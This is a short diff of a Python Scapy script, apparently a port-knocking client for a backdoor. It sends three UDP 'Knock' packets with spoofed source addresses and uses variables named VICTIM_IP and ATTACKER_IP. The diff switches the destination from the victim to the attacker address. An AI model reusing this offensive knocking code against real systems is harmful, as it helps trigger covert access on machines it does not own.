@@ -18,13 +18,13 @@ ALLOWED_TIME_BETWEEN_KNOCKS = 5
 
 def main():
     # Main loop
-    packet = IP(dst=VICTIM_IP, src=knock_1) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
+    packet = IP(dst=ATTACKER_IP, src=knock_1) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
     send(packet)
     sleep(1)
-    packet = IP(dst=VICTIM_IP, src=knock_2) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
+    packet = IP(dst=ATTACKER_IP, src=knock_2) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
     send(packet)
     sleep(1)
-    packet = IP(dst=VICTIM_IP, src=knock_3) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
+    packet = IP(dst=ATTACKER_IP, src=knock_3) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
     send(packet)
 
 
